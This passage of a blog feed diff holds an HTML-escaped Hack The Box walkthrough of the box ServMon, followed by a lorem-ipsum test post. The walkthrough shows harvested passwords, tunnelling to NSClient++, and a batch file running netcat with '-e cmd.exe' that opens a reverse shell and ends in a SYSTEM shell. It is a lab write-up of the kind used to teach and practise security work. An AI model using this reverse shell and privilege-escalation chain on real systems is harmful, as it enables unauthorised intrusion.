+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Scanned 1 of 1 hosts &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;100% &lt;span class=&quot;nb&quot;&gt;complete&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Auxiliary module execution completed
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;We see the exploit has created a text file and looking into it we find creds:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$cat&lt;/span&gt; /root/.msf4/loot/20200417043745_default_10.10.10.184_nvms.traversal_115301.txt
+
+1nsp3ctTh3Way2Mars!
+Th3r34r3To0M4nyTrait0r5!
+B3WithM30r4ga1n5tMe
+L1k3B1gBut7s@W0rk
+0nly7h3y0unGWi11F0l10w
+IfH3s4b0Utg0t0H1sH0me
+Gr4etN3w5w17hMySk1Pa5&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Trying these a little bit we find that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;L1k3B1gBut7s@W0rk&lt;/code&gt; works for Nadine via ssh:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh nadine@10.10.10.184
+nadine@10.10.10.184&lt;span class=&quot;s1&quot;&gt;'s password: 
+Microsoft Windows [Version 10.0.18363.752]          
+(c) 2019 Microsoft Corporation. All rights reserved.
+                                                    
+nadine@SERVMON C:\Users\Nadine&amp;gt; dir Desktop          
+ Volume in drive C has no label.                  
+ Volume Serial Number is 728C-D22C                
+                                                  
+ Directory of C:\Users\Nadine\Desktop             
+                                                  
+08/04/2020  22:28    &amp;lt;DIR&amp;gt;          .             
+08/04/2020  22:28    &amp;lt;DIR&amp;gt;          ..            
+17/04/2020  08:31                34 user.txt
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;and we have completed user.&lt;/p&gt;
+&lt;h1 id=&quot;root-part&quot;&gt;Root part&lt;/h1&gt;
+&lt;p&gt;For the root part we look into the NSClient mentioned in Nathans notes in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\Program Files\NSClient++&lt;/code&gt;.
+Looking into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nsclient.ini&lt;/code&gt; we see plaintext creds and allowed hosts:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Undocumented key
+password &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ew2x6SsGTxjRwXOT
+
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Undocumented key
+allowed hosts &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 127.0.0.1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;So we can connect to the service from localhost only, therefore we need a ssh tunnel:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; 8443:127.0.0.1:8443 nadine@10.10.10.184
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p class=&quot;text-justify&quot;&gt;and entering &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://localhost:8443&lt;/code&gt; the NSClient++ asks for a password but the password from nsclient.ini will do the job.
+This is where the heated discussion began:
+Searching for a common exploit through metasploit revealed:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;searchsploit nsclient
+&lt;span class=&quot;nt&quot;&gt;-------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;----------------------------------------&lt;/span&gt;
+ Exploit Title                                         |  Path
+                                                       | &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;/usr/share/exploitdb/&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;-------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;----------------------------------------&lt;/span&gt;
+NSClient++ 0.5.2.35 - Privilege Escalation             | exploits/windows/local/46802.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p class=&quot;text-justify&quot;&gt;and checking the NSClient++ page we see that this is the latest version available. In the text file are seven steps outlined to compromise the system. It turns out that only a few of the steps need to be done and especially the last command will crash the NSClient for all users on the box. Furthermore the steps require to upload a script called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;evil.bat&lt;/code&gt; which simply calls netcat and establishes a connection to our attacking machine. Since the script has to contain the IP of each user it has the risk of being overwritten. Obviously crashing the server is not the intended way and one has to be careful not to overwrite others scripts.&lt;/p&gt;
+&lt;p&gt;The &lt;em&gt;intended&lt;/em&gt; way to load the script is through the API:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;Write the following lines into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exploit.bat&lt;/code&gt;:
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;@echo off
+C:&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;c.exe your_ip port &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; cmd.exe
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Upload nc.exe and your &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exploit.bat&lt;/code&gt; to C:\Temp via scp: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scp nc.exe nadine@10.10.10.184:&quot;C:\Temp&quot;&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scp exploit.bat nadine@10.10.10.184:&quot;C:\Temp&quot;&lt;/code&gt;.&lt;/li&gt;
+  &lt;li&gt;Run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc -lnvp port&lt;/code&gt; with the port specified in the script.&lt;/li&gt;
+  &lt;li&gt;Create an external script in the NSClient++ via “Settings” -&amp;gt; “external Scripts” -&amp;gt; “scripts” -&amp;gt; green box “add a simple script”: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Alias: exploit; Script C:\Temp\exploit.bat&lt;/code&gt;. Save and optionally check the nsclient.ini if your entry appears.&lt;/li&gt;
+  &lt;li&gt;Access the api:&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nadine@SERVMON C:&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rogram Files&lt;span class=&quot;se&quot;&gt;\N&lt;/span&gt;SClient++&amp;gt;curl &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; admin https://localhost:8443/api/v1/mod
+ules
+nter host password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;user &lt;span class=&quot;s1&quot;&gt;'admin'&lt;/span&gt;:
+HTTP/1.1 200
+Content-Length: 2299
+Set-cookie: &lt;span class=&quot;nv&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;yapnxrpMCARCr4zdGc81tBDKsMlaZTXC&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/
+Set-cookie: &lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;admin&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/
+
+&lt;span class=&quot;o&quot;&gt;[{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;description&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;Module used to execute external scripts&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;id&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;CheckExternalScripts&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;load_url&quot;&lt;/span&gt;
+:&lt;span class=&quot;s2&quot;&gt;&quot;https://localhost:8443/api/v1/modules/CheckExternalScripts/commands/load&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;loaded&quot;&lt;/span&gt;:true,&lt;span class=&quot;s2&quot;&gt;&quot;metad
+ata&quot;&lt;/span&gt;:&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;alias&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;plugin_id&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;0&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;module_url&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;https://localhost:8443/api/v1/modules/CheckExter
+nalScripts/&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;name&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;CheckExternalScripts&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;title&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;CheckExternalScripts&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;unload_url&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;https://
+localhost:8443/api/v1/modules/CheckExternalScripts/commands/unload&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;It shows us that we can load and unload external scripts via the specified &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_url&lt;/code&gt;.
+Doing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl -k -i -u admin https://localhost:8443/api/v1/mod
+ules/CheckExternalScripts/commands/unload&lt;/code&gt; should result in  a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Success unload CheckExternalScripts&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl -k -i -u admin https://localhost:8443/api/v1/mod
+ules/CheckExternalScripts/commands/load&lt;/code&gt; in a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Success load CheckExternalScripts&lt;/code&gt;respectively.&lt;/p&gt;
+
+&lt;p&gt;If we now enter &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exploit&lt;/code&gt; in the Console of the web interface we receive our reverse shell as Administrator:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-lnvp&lt;/span&gt; 443
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;kali: 
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
+connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.23] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.184] 50611
+Microsoft Windows &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Version 10.0.18363.752]
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2019 Microsoft Corporation. All rights reserved.
+
+C:&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rogram Files&lt;span class=&quot;se&quot;&gt;\N&lt;/span&gt;SClient++&amp;gt;whoami
+&lt;span class=&quot;nb&quot;&gt;whoami
+&lt;/span&gt;nt authority&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Philipp Menner</name></author><category term="boxes" /><category term="windows" /><summary type="html">Write-up of the box ServMon from Hack The Box</summary></entry><entry><title type="html">Another test</title><link href="http://localhost:4000/boxes/asd/" rel="alternate" type="text/html" title="Another test" /><published>2020-05-23T11:33:36-04:00</published><updated>2020-05-23T11:33:36-04:00</updated><id>http://localhost:4000/boxes/asd</id><content type="html" xml:base="http://localhost:4000/boxes/asd/">&lt;p&gt;TEST
 Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren, no sea takimata sanctus est Lorem ipsum dolor sit amet. Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren, no sea takimata sanctus est Lorem ipsum dolor sit amet.&lt;/p&gt;
 
 &lt;h1 id=&quot;root-exploit&quot;&gt;Root exploit&lt;/h1&gt;
